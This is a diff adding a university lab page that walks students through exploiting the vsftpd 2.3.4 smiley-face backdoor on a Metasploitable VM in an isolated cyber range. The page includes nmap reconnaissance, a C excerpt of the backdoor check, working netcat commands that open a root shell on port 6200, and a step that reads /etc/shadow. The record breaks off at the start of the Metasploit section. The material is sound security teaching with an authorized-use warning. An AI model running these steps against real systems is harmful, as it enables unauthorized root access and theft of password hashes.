@@ -1,0 +1,568 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>lab 00 — Your first exploit (vsftpd backdoor)</title>
+<link rel="stylesheet" href="../_shared/lab-base.css?v=5">
+<link rel="stylesheet" href="styles.css?v=6">
+<!-- Prism for syntax highlighting -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/themes/prism.min.css">
+<script defer src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-core.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-bash.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-python.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-c.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/plugins/autoloader/prism-autoloader.min.js"></script>
+</head>
+<body>
+
+<!-- ============================================================ -->
+<!-- Presentation-mode toggle — top-left, fixed                    -->
+<!-- ============================================================ -->
+<button type="button" id="present-toggle" class="present-toggle" title="Toggle presentation mode (P)">
+  <span class="present-icon">◧</span>
+  <span class="present-label">Present</span>
+</button>
+
+<aside class="toc">
+  <div class="toc-title">DS 6042</div>
+  <nav>
+    <ul>
+      <li><a href="#intro">Introduction</a></li>
+      <li><a href="#demo">Demo · try it</a></li>
+      <li><a href="#where">An overview of tools and targets</a></li>
+      <li><a href="#authorized">Authorized use</a></li>
+      <li><a href="#team">1 · Form your team</a></li>
+      <li><a href="#cyberrange">2 · Cyber range</a></li>
+      <li><a href="#recon">3 · Reconnaissance</a></li>
+      <li><a href="#ftp">4 · FTP in 60 seconds</a></li>
+      <li><a href="#smiley">5 · The smiley trigger</a></li>
+      <li><a href="#exploit">6 · Manual exploit</a></li>
+      <li><a href="#msf">7 · Metasploit</a></li>
+      <li><a href="#reflection">8 · Reflection</a></li>
+      <li><a href="#deliverables">Deliverables</a></li>
+      <li><a href="#faq">FAQ</a></li>
+    </ul>
+  </nav>
+  <div class="toc-foot">
+    <span style="color:var(--ink-mute)">Lab 00 · orientation · vsftpd 2.3.4 backdoor · CVE-2011-2523</span>
+  </div>
+</aside>
+
+<main>
+
+<header class="hero" id="intro">
+  <div class="eyebrow">DS 6042 · Lab 00 · 2026</div>
+  <h1>Your first exploit</h1>
+  <p class="subtitle">Form a team. Connect to the cyber range. Pop a root shell with a smiley face.</p>
+  <p class="byline">Lab 00 is orientation. By the end of class you will have stood up a root shell on a remote machine — twice — without writing any code, using a famous one-byte trigger in vsftpd 2.3.4.</p>
+</header>
+
+<p class="course-frame keep-in-present">
+The goal of <strong>DS 6042</strong> is to teach the tools, techniques, and mental models you need to <strong>build and deploy secure data pipelines and AI systems</strong>. The course starts on the attacker's side, though: before you can reason about defending a system, you should know what it feels like to break one — which tools attackers reach for, which assumptions they exploit, and the mental model behind a real intrusion. Lab 0 is your first hour in that seat.
+</p>
+
+<p class="lede">
+In July 2011 the official <span class="gloss" data-gloss="vsftpd">vsftpd</span> download server was compromised: the maintainer's release <span class="gloss" data-gloss="tarball">tarball</span> was briefly replaced with a <span class="gloss" data-gloss="backdoor">backdoored</span> copy. Anyone who logged in with a username ending in <code>:)</code> — a literal smiley face — tripped a hidden code path that <span class="gloss" data-gloss="fork-sh">forked <code>/bin/sh</code></span> and bound it to <span class="gloss" data-gloss="tcp-port">TCP port</span> 6200. The poisoned binary was caught within days, but it lives on inside <a href="https://docs.rapid7.com/metasploit/metasploitable-2/">Metasploitable 2</a>, the deliberately vulnerable Linux VM the security community uses for teaching. You will fire it three different ways today.
+</p>
+
+<div class="cite">
+  <a href="https://nvd.nist.gov/vuln/detail/CVE-2011-2523">CVE-2011-2523</a> · post-mortem on the <a href="https://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html">scarybeasts (vsftpd maintainer) blog</a> · Metasploit module: <a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb"><code>vsftpd_234_backdoor.rb</code></a> · target: <a href="https://docs.rapid7.com/metasploit/metasploitable-2/">Metasploitable 2</a>.
+</div>
+
+<div class="callout insight keep-in-present">
+  <span class="label">important · inline questions throughout this lab</span>
+  <p>Every major section ends with a short <strong>"Try it"</strong> block. <strong>The shape of those questions is the same shape that appears on the midterm and final exam</strong> — attempt each one yourself before clicking "Show answer." They're the most efficient exam prep this lab offers; don't skim past them.</p>
+</div>
+
+<!-- ============================================================ -->
+<!-- Glossary hint + inline panel — terms in the lede above are     -->
+<!-- hoverable. The panel opens below this paragraph and pushes     -->
+<!-- the Try-It widget down; it never covers anything.              -->
+<!-- ============================================================ -->
+<p class="glossary-hint">
+  A few words above will be unfamiliar — <strong>TCP port</strong>, <code>/bin/sh</code>, <strong>vsftpd</strong>, <strong>tarball</strong>. You don't have to know them yet. Every term <span class="gloss-demo">underlined like this</span> on this page is hoverable: an explainer opens directly below the line you're reading, pushing the rest of the page down — nothing gets covered.
+</p>
+
+<div class="glossary-panel" id="glossary-panel" hidden aria-live="polite">
+  <button type="button" class="glossary-close" id="glossary-close" aria-label="Close explainer">×</button>
+  <div class="glossary-content" id="glossary-content"></div>
+</div>
+
+<!-- ============================================================ -->
+<h2 id="demo">Demo · the attack you're about to run</h2>
+<p>The widget below is a simulation of the full exploit chain — every keystroke, every server response, every shell. <strong>By the end of §6 you'll have done all of this for real</strong> against the Metasploitable VM in the cyber range. Use the demo now to see where we're headed; come back to it later if you get stuck.</p>
+
+<!-- ============================================================ -->
+<!-- TRY IT — two-terminal exploit simulator                        -->
+<!-- ============================================================ -->
+<div class="viz" id="viz-try-it">
+  <div class="viz-title">Try it · two terminals, one shell</div>
+  <div class="viz-description">
+    Two attacker terminals, one target at <code>10.0.0.6</code>. Use <strong>Terminal&nbsp;A</strong> to trigger the backdoor on port 21 — start with <code>nc 10.0.0.6 21</code>, then send <code>USER hacker:)</code> and any <code>PASS</code>. Then use <strong>Terminal&nbsp;B</strong> to connect to the hidden shell on port 6200 — <code>nc 10.0.0.6 6200</code> — and run <code>id</code>. Or click <strong>▶ Auto-play</strong> to watch the entire attack run itself.
+  </div>
+  <div class="term-pair">
+    <div class="term" data-term="A">
+      <div class="term-label">Terminal A · attacker → ftp (tcp/21)</div>
+      <div class="term-screen" id="term-a-screen" aria-live="polite"></div>
+      <form class="term-input-row" data-term="A">
+        <span class="term-prompt" id="term-a-prompt">kali@kali:~$&nbsp;</span>
+        <input class="term-input" id="term-a-input" autocomplete="off" autocapitalize="off" spellcheck="false" placeholder="type here, press enter">
+      </form>
+    </div>
+    <div class="term" data-term="B">
+      <div class="term-label">Terminal B · attacker → backdoor (tcp/6200)</div>
+      <div class="term-screen" id="term-b-screen" aria-live="polite"></div>
+      <form class="term-input-row" data-term="B">
+        <span class="term-prompt" id="term-b-prompt">kali@kali:~$&nbsp;</span>
+        <input class="term-input" id="term-b-input" autocomplete="off" autocapitalize="off" spellcheck="false" placeholder="type here, press enter">
+      </form>
+    </div>
+  </div>
+  <div class="term-controls">
+    <button class="btn primary" id="term-autoplay" type="button">▶ Auto-play the attack</button>
+    <button class="btn" id="term-reset" type="button">↺ Reset both</button>
+    <span class="term-hint" id="term-hint">Hint · type <code>nc 10.0.0.6 21</code> in Terminal A.</span>
+  </div>
+  <p class="viz-caption">Both terminals are simulated; nothing leaves your browser. The real exploit runs the same keystrokes against a real Metasploitable VM inside the cyber range (Section 6 below).</p>
+</div>
+
+<!-- ============================================================ -->
+<h2 id="where">An Overview of Tools and Targets</h2>
+<ul>
+  <li>Target: <strong>Metasploitable 2</strong> on a private subnet, no internet egress. The vulnerable service is <code>vsftpd 2.3.4</code> on TCP/21.</li>
+  <li>Tools (pre-installed on the Kali VM): <code>nmap</code>, <code>nc</code> (netcat), <code>msfconsole</code> (Metasploit Framework).</li>
+  <li>Original CVE: <a href="https://nvd.nist.gov/vuln/detail/CVE-2011-2523">CVE-2011-2523</a>. Metasploit module: <code>exploit/unix/ftp/vsftpd_234_backdoor</code>.</li>
+</ul>
+
+<!-- ============================================================ -->
+<h2 id="authorized">Authorized use - Read this carefully.</h2>
+<p class="keep-in-present">Everything you are about to do is illegal outside an authorized environment. The Virginia Cyber Range is authorized — it is a private, isolated cloud network provisioned specifically for educational use, with no path to the public internet. <strong>You may not</strong> run these tools against your laptop's wifi, your dorm network, your employer's network, AWS instances you happen to own, friends' machines, or anything else not assigned to this course. Port scanning alone can be a felony under the Computer Fraud and Abuse Act (18 U.S.C. § 1030). Stay in the sandbox.</p>
+
+<!-- ============================================================ -->
+<h2 id="team">1 · Form your team <span class="time-tag">~15 min</span></h2>
+
+<p>Teams of <strong>2 or 3 students</strong>. Labs 1 through 20 are built around team collaboration — you will pair-program, hand work off mid-lab, and present together at module reviews.</p>
+
+<div class="callout note">
+  <span class="label">team contract · one page, ten minutes</span>
+  <p>Write a one-page contract covering: (1) names + the contact channel you actually check, (2) meeting cadence outside class, (3) decision rule for disagreements, (4) workload split per lab, (5) escalation path if a teammate disappears.</p>
+  <p>Pick a short lowercase team handle — one word, no spaces (e.g. <code>mockingbird</code>, <code>redoubt</code>, <code>cardinal</code>). You will use it as a filename prefix all semester.</p>
+  <div class="chat-downloads">
+    <span class="chat-downloads-label">Sample contract template:</span>
+    <a href="team-contract-template.docx" download class="chat-dl-btn">↓ team-contract-template.docx</a>
+  </div>
+</div>
+
+<p><strong>Submit on Gradescope (one per team):</strong> roster + handle + signed contract.</p>
+
+<!-- ============================================================ -->
+<h2 id="cyberrange">2 · Connect to the Virginia Cyber Range <span class="time-tag">~20 min</span></h2>
+
+<p>The Virginia Cyber Range (VCR) is a cloud-hosted cyber range. Every lab that involves attacking or defending a live system happens inside it. Each team gets a personal isolated network containing a Kali Linux VM (attacker) and a Metasploitable 2 VM (target).</p>
+
+<ol class="numbered-steps">
+  <li><strong>Accept the enrollment invite.</strong> Click the button below, sign in with netbadge, and accept the course. <a class="btn primary enroll-btn" href="https://console.virginiacyberrange.net/registration/REWVU46H2YPM" target="_blank" rel="noopener">Click the invitation code ↗</a></li>
+  <li><strong>Launch the exercise.</strong> Click <em>Launch Exercise</em>. Provisioning takes ~60 seconds. Two VMs spin up: <code>kali</code> (attacker, what you'll use) and <code>metasploitable</code> (target, what you'll exploit).</li>
+  <li><strong>Connect to Kali.</strong> The cyber range opens a full Linux desktop in your browser via Apache Guacamole — no <span class="gloss" data-gloss="ssh">SSH</span> client needed. Default login is <code>kali</code>/<code>kali</code> (a public default that is <em>only</em> acceptable inside an isolated cyber range — never assume defaults are safe in production).</li>
+  <li><strong>Open a Terminal Emulator on Kali.</strong> You'll do everything from here on in this terminal — run the four commands below, in order.</li>
+</ol>
+
+<figure class="lab-figure">
+  <img src="kali-desktop.png" alt="Kali Linux desktop with the Applications menu and a terminal icon visible in the top-left panel">
+  <figcaption>A Kali Linux desktop. Fastest path to a terminal: the <strong><code>&gt;_</code> icon</strong> in the top panel (third from the left). The <strong>Applications</strong> menu (top-left) also lists <em>Terminal Emulator</em> under <em>System Tools</em>. The cyber range ships a current XFCE-based Kali whose menu lives behind a small dragon icon in the same top-left position — the click target is what matters, not the styling. <small>Image: <a href="https://commons.wikimedia.org/wiki/File:Kali_Linux.png">Wikimedia Commons</a> (GPL).</small></figcaption>
+</figure>
+
+<p><strong>2a · Find your own IP.</strong> <code>ip a</code> dumps every network interface on the box. The one that matters is <code>eth0</code> — your connection to the cyber range's private <span class="gloss" data-gloss="subnet">subnet</span>.</p>
+
+<pre class="term-snippet"><span class="term-comment">$</span> <span class="term-cmd">ip a</span>
+1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000
+    link/ether 02:42:0a:00:00:05 brd ff:ff:ff:ff:ff:ff
+    <span class="term-hl">inet 10.0.0.5/24</span> brd 10.0.0.255 scope global eth0
+       valid_lft forever preferred_lft forever</pre>
+
+<p>The highlighted line tells you two things: your IP is <strong>10.0.0.5</strong>, and the <code>/24</code> says you share a subnet with every IP from <code>10.0.0.0</code> to <code>10.0.0.255</code>. (Your actual address will differ — note yours.)</p>
+
+<p><strong>2b · Find the target with a ping sweep.</strong> Ask Nmap to send one <span class="gloss" data-gloss="icmp">ICMP</span> probe to every address on the subnet. <code>-sn</code> means "ping scan only, no port scan" — fast host discovery.</p>
+
+<pre class="term-snippet"><span class="term-comment">$</span> <span class="term-cmd">sudo nmap -sn 10.0.0.0/24</span>
+Starting Nmap 7.94 ( https://nmap.org ) at 2026-09-04 14:20 UTC
+Nmap scan report for 10.0.0.1
+Host is up (0.00012s latency).
+Nmap scan report for 10.0.0.5
+Host is up.
+<span class="term-hl">Nmap scan report for 10.0.0.6</span>
+<span class="term-hl">Host is up (0.00033s latency).</span>
+Nmap done: 256 IP addresses (3 hosts up, 0.762 seconds elapsed)</pre>
+
+<p>Three live hosts: <code>.1</code> (the cyber-range gateway), <code>.5</code> (you, from the previous step), and <code>.6</code> — the one that isn't either of those. That's your <strong>target</strong>.</p>
+
+<p><strong>2c · Save the target IP into a shell variable.</strong> Every command in the rest of this lab uses <code>$TARGET</code> instead of hard-coding the address. That way you can copy-paste examples without editing them — and so can your teammate.</p>
+
+<pre class="term-snippet"><span class="term-comment">$</span> <span class="term-cmd">export TARGET=10.0.0.6</span>
+<span class="term-comment">$</span> <span class="term-cmd">echo $TARGET</span>
+<span class="term-hl">10.0.0.6</span></pre>
+
+<p><code>export</code> places the variable into the shell's environment so child processes (like <code>nc</code>, <code>nmap</code>, and <code>msfconsole</code>) inherit it. If <code>echo $TARGET</code> prints your target IP back, you're good. Write the IP in your shared team notes so your teammate has it too.</p>
+
+<div class="exercise">
+  <div class="ex-label">Try it · subnet math</div>
+  <p>Your Kali instance is on <code>10.0.0.5/24</code>. <strong>How many addresses</strong> does that subnet contain? Two of those addresses are conventionally reserved for non-host use — <strong>which two, and what are they used for</strong>?</p>
+  <details><summary>Show answer</summary><div>The <code>/24</code> means the first 24 of 32 IP bits are fixed; the remaining 8 are free. That's <code>2<sup>8</sup> = <strong>256 addresses</strong></code>, <code>10.0.0.0</code> through <code>10.0.0.255</code>. Two are reserved: <code>10.0.0.0</code> is the <strong>network address</strong> (refers to the subnet itself; never assigned to a host), and <code>10.0.0.255</code> is the <strong>broadcast address</strong> (a packet to this address is delivered to every host on the subnet). The remaining 254 are assignable to actual hosts — yours is <code>.5</code>, the gateway is <code>.1</code>, the target is <code>.6</code>.</div></details>
+</div>
+
+<p><strong>2d · Confirm the target is reachable.</strong> Send one ping packet and watch for a reply. If you don't get one, the target VM hasn't finished booting — wait 30 seconds and try again.</p>
+
+<pre class="term-snippet"><span class="term-comment">$</span> <span class="term-cmd">ping -c 1 $TARGET</span>
+PING 10.0.0.6 (10.0.0.6) 56(84) bytes of data.
+<span class="term-hl">64 bytes from 10.0.0.6: icmp_seq=1 ttl=64 time=0.412 ms</span>
+
+--- 10.0.0.6 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.412/0.412/0.412/0.412 ms</pre>
+
+<p><strong>1 received, 0% packet loss</strong> — the target is up and reachable. You're ready for section 3.</p>
+
+<div class="callout note">
+  <span class="label">deliverable · part 2</span>
+  <p>Both teammates can independently log into VCR and ping the target from their Kali instance. Take a screenshot of <code>ping $TARGET</code> succeeding.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2 id="recon">3 · Reconnaissance — identify the service <span class="time-tag">~30 min</span></h2>
+
+<p>You have a target IP. You don't yet know what's running on it. Real <span class="gloss" data-gloss="enumeration">enumeration</span> follows a fixed pattern: <strong>scan ports → identify services → identify versions → look up vulnerabilities for those versions.</strong> Today we do all four.</p>
+
+<h3>3.1 Find open ports</h3>
+
+<pre><code class="language-bash">sudo nmap -p- $TARGET</code></pre>
+
+<p><code>-p-</code> scans all 65,535 TCP ports (the default is the top 1,000 — fast, but the real world doesn't always cooperate). The full scan takes ~1–2 minutes against Metasploitable, which deliberately runs many vulnerable services. Your output will look something like this (truncated):</p>
+
+<pre class="term-snippet"><span class="term-comment">$</span> <span class="term-cmd">sudo nmap -p- 10.0.0.6</span>
+PORT     STATE SERVICE
+<span class="term-hl">21/tcp   open  ftp</span>           <span class="term-comment"># &lt;- the one we exploit today</span>
+22/tcp   open  ssh
+23/tcp   open  telnet
+25/tcp   open  smtp
+53/tcp   open  domain
+80/tcp   open  http
+111/tcp  open  rpcbind
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+512/tcp  open  exec
+513/tcp  open  login
+514/tcp  open  shell
+1099/tcp open  rmiregistry
+1524/tcp open  ingreslock
+2049/tcp open  nfs
+2121/tcp open  ccproxy-ftp
+3306/tcp open  mysql
+3632/tcp open  distccd
+5432/tcp open  postgresql
+5900/tcp open  vnc
+6000/tcp open  X11
+6667/tcp open  irc
+8009/tcp open  ajp13
+8180/tcp open  unknown
+<span class="term-comment"># ... ~25 services in total</span></pre>
+
+<p>The whole point of Metasploitable is that it deliberately exposes a buffet of vulnerable services — FTP, Telnet, NetBIOS, MySQL, PostgreSQL, IRC, distcc, and more — each with at least one known exploit. Today we only attack <strong>21 (ftp)</strong>. The other twenty-plus services on this same VM are real attack surfaces; in <a href="../lab-10/pentest.html">Lab 10</a> you will let an agent enumerate and exploit several of them in one engagement.</p>
+
+<h3>3.2 Identify the service version</h3>
+
+<pre><code class="language-bash">sudo nmap -sV -p 21 $TARGET</code></pre>
+
+<p><code>-sV</code> is <em>service-version detection</em>: Nmap connects to each port, reads the <span class="gloss" data-gloss="banner">banner</span> that the service sends back, and matches it against its fingerprint database. You should see this:</p>
+
+<div class="viz" id="viz-nmap">
+  <div class="viz-title">expected nmap output</div>
+  <pre class="term-snippet"><span class="term-comment">$</span> <span class="term-cmd">sudo nmap -sV -p 21 $TARGET</span>
+Starting Nmap 7.94 ( https://nmap.org ) at 2026-09-04 14:21 UTC
+Nmap scan report for 10.0.0.6
+Host is up (0.00033s latency).
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     <span class="term-hl">vsftpd 2.3.4</span>
+
+Service detection performed. Please report any incorrect results.
+Nmap done: 1 IP address (1 host up) scanned in 6.31 seconds</pre>
+  <p class="viz-caption">The version string <code>vsftpd 2.3.4</code> is the smoking gun. That specific release has a famous, easy-to-trigger backdoor — which is why we picked it for the first lab.</p>
+</div>
+
+<h3>3.3 Confirm the banner with your own eyes</h3>
+
+<p>You don't have to trust Nmap. Connect to the FTP service with <code>nc</code> (netcat, the swiss-army-knife TCP client):</p>
+
+<pre><code class="language-bash">nc $TARGET 21
+# 220 (vsFTPd 2.3.4)        ← server greeting
+QUIT
+# 221 Goodbye.</code></pre>
+
+<p><code>220</code> is the FTP "service ready" reply code. The parenthesized string is exactly what <code>nmap -sV</code> was reading.</p>
+
+<!-- ============================================================ -->
+<h2 id="ftp">4 · FTP in 60 seconds</h2>
+
+<p>FTP (File Transfer Protocol) is a plaintext, line-oriented <span class="gloss" data-gloss="protocol">protocol</span> from 1971. The client sends ASCII commands one per line; the server replies with a three-digit code plus a human-readable message.</p>
+
+<div class="viz" id="viz-ftp-protocol">
+  <div class="viz-title">a normal FTP login · client ↔ server</div>
+  <div class="viz-description">Each row is one line on the wire. Three-digit codes are responses; everything else is commands. <strong>1xx</strong> = positive preliminary, <strong>2xx</strong> = positive completion, <strong>3xx</strong> = needs more input, <strong>4xx</strong>/<strong>5xx</strong> = failure.</div>
+  <table class="proto">
+    <thead><tr><th>direction</th><th>line</th><th>meaning</th></tr></thead>
+    <tbody>
+      <tr><td class="proto-dir from-srv">← server</td><td><code>220 (vsFTPd 2.3.4)</code></td><td>service ready, banner</td></tr>
+      <tr><td class="proto-dir from-cli">→ client</td><td><code>USER alice</code></td><td>"I want to log in as alice"</td></tr>
+      <tr><td class="proto-dir from-srv">← server</td><td><code>331 Please specify the password.</code></td><td>username known, need password</td></tr>
+      <tr><td class="proto-dir from-cli">→ client</td><td><code>PASS hunter2</code></td><td>password</td></tr>
+      <tr><td class="proto-dir from-srv">← server</td><td><code>230 Login successful.</code></td><td>authenticated</td></tr>
+      <tr><td class="proto-dir from-cli">→ client</td><td><code>QUIT</code></td><td>close session</td></tr>
+      <tr><td class="proto-dir from-srv">← server</td><td><code>221 Goodbye.</code></td><td>session closed</td></tr>
+    </tbody>
+  </table>
+  <p class="viz-caption">The entire attack is two of these lines: a crafted <code>USER</code> and any <code>PASS</code>. No real authentication happens — read on.</p>
+</div>
+
+<div class="exercise">
+  <div class="ex-label">Try it · reading response codes</div>
+  <p>Suppose you sent <code>USER alice</code> and the server replied with <code>230 Login successful.</code> instead of <code>331 Please specify the password.</code>. What does that tell you about the server's configuration — and why might it matter to a security audit?</p>
+  <details><summary>Show answer</summary><div>The server accepted the login <em>without a password</em>. Two ways that can happen in real FTP servers: <strong>anonymous FTP is enabled</strong> (an <code>anonymous</code> or <code>ftp</code> account is mapped to a guest directory and accepts any password including none), or <strong>the account has no password set</strong>. Either is a significant audit finding. Anonymous FTP made sense in 1985 for sharing public files; in 2026 most production servers should require authentication, and a server that accepts unauthenticated logins is leaking either configuration (it's intentional and may be fine) or a credential-management failure (it's accidental and is not fine).</div></details>
+</div>
+
+<!-- ============================================================ -->
+<h2 id="smiley">5 · The smiley trigger</h2>
+
+<p>In vsftpd 2.3.4, the attacker who included <strong><code>:)</code> at the end of the <code>USER</code> argument</strong> tripped a hidden branch that forked <code>/bin/sh</code> and bound it to TCP port 6200. The author of the malicious code is unknown — it was injected by whoever compromised the download server. Stripped to its essence, the poisoned source did something like this:</p>
+
+<pre><code class="language-c">/* str.c, hostile addition — vsftpd-2.3.4 backdoored tarball */
+if (p_str-&gt;p_buf[i] == 0x3a    /* ':' */
+ &amp;&amp; p_str-&gt;p_buf[i+1] == 0x29) /* ')' */
+{
+    vsf_sysutil_extra();        /* fork /bin/sh, bind :6200 */
+}</code></pre>
+
+<p>The check happens <strong>before authentication</strong>, so the <code>PASS</code> you send doesn't matter — but you still have to send one to keep the protocol state machine happy.</p>
+
+<div class="viz" id="viz-smiley">
+  <div class="viz-title">click a username · watch the server's branch</div>
+  <div class="viz-description">Pick a username. The flowchart on the right shows which path the backdoored vsftpd takes when it processes the <code>USER</code> command. Only the highlighted path runs.</div>
+  <div class="smiley-grid">
+    <div class="smiley-picker">
+      <div class="smiley-picker-label">USER &lt;name&gt;</div>
+      <button class="btn smiley-btn" data-user="alice">alice</button>
+      <button class="btn smiley-btn" data-user="root">root</button>
+      <button class="btn smiley-btn" data-user="hacker">hacker</button>
+      <button class="btn smiley-btn primary" data-user="hacker:)">hacker:)</button>
+      <button class="btn smiley-btn" data-user=":)">:)</button>
+      <button class="btn smiley-btn" data-user="alice:)bob">alice:)bob</button>
+      <div class="smiley-readout" id="smiley-readout">Pick a username on the left.</div>
+    </div>
+    <svg id="smiley-svg" class="smiley-svg" viewBox="0 0 360 360" preserveAspectRatio="xMidYMid meet" aria-label="vsftpd 2.3.4 USER command flowchart"></svg>
+  </div>
+  <p class="viz-caption">The substring check happens <em>anywhere in the username</em>, not just at the end — <code>alice:)bob</code> trips it too. The check happens before vsftpd ever looks at the password file.</p>
+</div>
+
+<div class="exercise">
+  <div class="ex-label">Try it · read the code, trace each username</div>
+  <p>Here's a Python equivalent of the vsftpd 2.3.4 backdoor check — the C snippet in §5 above with the surrounding loop made explicit:</p>
+  <pre><code class="language-python">def trips_backdoor(username: str) -> bool:
+    """Return True if the username would trip the vsftpd 2.3.4 backdoor."""
+    for i in range(len(username) - 1):
+        if username[i] == ':' and username[i + 1] == ')':
+            return True
+    return False</code></pre>
+  <p>For each username below, <strong>trace the loop in your head</strong>: what does <code>trips_backdoor</code> return? If <code>True</code>, at what value of <code>i</code>? Don't peek at the answer until you've decided on all six.</p>
+  <ol>
+    <li><code>hacker</code></li>
+    <li><code>hacker:)</code></li>
+    <li><code>alice:)bob</code></li>
+    <li><code>:)</code></li>
+    <li><code>bob:</code></li>
+    <li><code>:)alice:)</code></li>
+  </ol>
+  <details><summary>Show answer</summary><div>
+    <p>The loop tests, at every position <code>i</code>, whether <code>username[i] == ':'</code> AND <code>username[i+1] == ')'</code>. As soon as both are true, the function returns. Tracing each:</p>
+    <ol>
+      <li><code>hacker</code> — no <code>:</code> anywhere; loop completes; <strong>returns False</strong>.</li>
+      <li><code>hacker:)</code> — at <code>i=6</code> we have <code>':'</code> and <code>username[7]</code> is <code>')'</code>; <strong>returns True at i=6</strong>.</li>
+      <li><code>alice:)bob</code> — at <code>i=5</code> we have <code>':'</code> and <code>username[6]</code> is <code>')'</code>; <strong>returns True at i=5</strong>. The function exits before reading <code>bob</code>.</li>
+      <li><code>:)</code> — at <code>i=0</code> we have <code>':'</code> and <code>username[1]</code> is <code>')'</code>; <strong>returns True at i=0</strong>.</li>
+      <li><code>bob:</code> — the trailing <code>':'</code> is at index 3, but the loop bound is <code>range(len-1) = range(3)</code> → <code>i ∈ {0, 1, 2}</code>. We never test index 3. <strong>Returns False</strong> — and notice <em>why</em>: the implementation safely avoids reading past the end of the string by stopping early.</li>
+      <li><code>:)alice:)</code> — at <code>i=0</code> we already have a smiley; <strong>returns True at i=0</strong>. The second smiley at the end is never reached.</li>
+    </ol>
+    <p>The lesson: substring matches are not "starts with" or "ends with" — the trigger fires the first time the byte pair appears, anywhere in the input. The off-by-one in case (5) is worth noticing — the loop bound is the reason a lone trailing colon doesn't crash the server reading past the buffer. Real production code has to handle this kind of edge case deliberately, even (especially) when the code is malicious.</p>
+  </div></details>
+</div>
+
+<!-- ============================================================ -->
+<h2 id="exploit">6 · Manual exploitation <span class="time-tag">~30 min</span></h2>
+
+<p>Now you do it for real. Open <strong>two terminal tabs</strong> on Kali — the same way the <a href="#viz-try-it">Try-it widget</a> has two — and follow along.</p>
+
+<div class="viz" id="viz-topology">
+  <div class="viz-title">what's about to happen on the wire</div>
+  <div class="viz-description">Two TCP connections from Kali to Metasploitable. The first one (port 21) arms the backdoor. The second one (port 6200) attaches to the resulting root shell.</div>
+  <svg id="topo-svg" class="topo-svg" viewBox="0 0 600 220" preserveAspectRatio="xMidYMid meet" aria-label="Kali to Metasploitable network topology"></svg>
+</div>
+
+<h3>6.1 Terminal A · arm the backdoor</h3>
+
+<pre><code class="language-bash">nc $TARGET 21
+# 220 (vsFTPd 2.3.4)
+USER hacker:)
+# 331 Please specify the password.
+PASS whatever
+# &lt;no response — server has forked the shell&gt;</code></pre>
+
+<p>The server <em>appears</em> to hang — it never returns a <code>230 Login successful</code> because the backdoor short-circuited the login handler. <strong>Leave this terminal open.</strong> Do not press <kbd>Ctrl</kbd>+<kbd>C</kbd>; that closes the FTP connection and tears the backdoor shell down with it.</p>
+
+<h3>6.2 Terminal B · attach to the shell</h3>
+
+<pre><code class="language-bash">nc $TARGET 6200
+id
+# uid=0(root) gid=0(root)
+whoami
+# root</code></pre>
+
+<p>The remote shell has no prompt and no welcome message. It looks like nothing happened. Type a command and press <kbd>Enter</kbd> — output appears. You are <span class="gloss" data-gloss="root"><strong>root</strong></span> on the target.</p>
+
+<h3>6.3 Confirm what root buys you</h3>
+
+<pre><code class="language-bash">hostname             # metasploitable
+uname -a             # Linux metasploitable 2.6.24-16-server ...
+cat /etc/shadow      # password hashes, normally root-only
+ls /root             # root's home directory
+exit                 # close the shell</code></pre>
+
+<p><code>/etc/shadow</code> is normally readable only by root because it contains password hashes. You can read it. That is the entire promise of the exploit: arbitrary code execution as the highest-privilege user on the machine, <em>before authentication</em>, in two lines.</p>
+
+<div class="callout insight">
+  <span class="label">deliverable · part 6</span>
+  <p>Screenshot of <code>id</code> returning <code>uid=0(root) gid=0(root)</code> inside the Terminal B shell. One short paragraph in your team notes: <em>in your own words, what did the smiley face do?</em></p>
+</div>
+
+<div class="exercise">
+  <div class="ex-label">Try it · why two terminals?</div>
+  <p>The exploit needs <em>two</em> <code>nc</code> connections — one to port 21 and another to port 6200. What's the role of each? What would happen if you tried to do both from a single <code>nc</code> session?</p>
+  <details><summary>Show answer</summary><div>The first <code>nc</code> session (port 21) delivers the trigger: <code>USER ...:)</code> + <code>PASS ...</code>. vsftpd reacts by forking <code>/bin/sh</code> and binding it to port 6200 — but that shell is its own process, listening on a different port. The second <code>nc</code> session (port 6200) attaches to <em>that</em> shell so you can type commands into it. A single <code>nc</code> session can only talk to one port at a time; it can't simultaneously be the FTP client AND the shell client. Two listeners → two connections → two terminals.</div></details>
+</div>
+
+<!-- ============================================================ -->
+<h2 id="msf">7 · The same attack, with Metasploit <span class="time-tag">~20 min</span></h2>
+
+<p>Now do it the "professional" way. The point of this section is to see that <span class="gloss" data-gloss="metasploit">Metasploit</span> is a wrapper around what you already did by hand — and to learn the workflow you will use for every exploit in the course.</p>
+
+<div class="viz" id="viz-msf">
+  <div class="viz-title">msfconsole · the same exploit, scripted</div>
+  <div class="viz-description">Each step has a one-line purpose. Hover any line to see what it does.</div>
+  <pre class="term-snippet" id="msf-snippet"><span class="term-comment">$</span> <span class="term-cmd">msfconsole</span>
+       =[ metasploit v6.3.x-dev                          ]
++ -- --=[ 2300+ exploits - 1200+ auxiliary - 400+ post   ]
+
+<span class="msf-line" data-explain="Search the module database for anything related to vsftpd.">msf6 &gt; <span class="term-cmd">search vsftpd</span></span>
+   #  Name                                       Disclosure Date  Rank
